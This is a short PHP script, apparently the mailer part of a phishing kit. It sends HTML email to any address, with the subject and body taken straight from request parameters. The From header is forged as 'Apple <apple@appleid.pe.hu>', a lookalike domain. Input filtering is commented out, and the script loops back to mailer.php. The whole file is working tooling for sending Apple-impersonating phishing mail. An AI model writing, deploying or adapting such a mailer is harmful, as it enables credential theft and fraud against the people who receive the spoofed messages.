<?php

if(!empty($_REQUEST['replyto']) && !empty($_REQUEST['subject']) && !empty($_REQUEST['message']))
		{
// multiple recipients

$to  =$_REQUEST['replyto']; 

// subject

$subject =$_REQUEST['subject'];
//filter_var($_REQUEST['subject'],FILTER_SANITIZE_STRING);


// message

$message = $_REQUEST['message'];

$headers  = 'MIME-Version: 1.0' . "\r\n";

$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

$headers .= 'From: Apple <apple@appleid.pe.hu>' . "\r\n";


// Mail it



mail($to, $subject, $message, $headers);
header ("Refresh:1;URL=mailer.php");
}
 else
		{
		echo'<script>alert("svp remplir tout les champs")</script>';
		header ("Refresh:1;URL=mailer.php");
		}

?>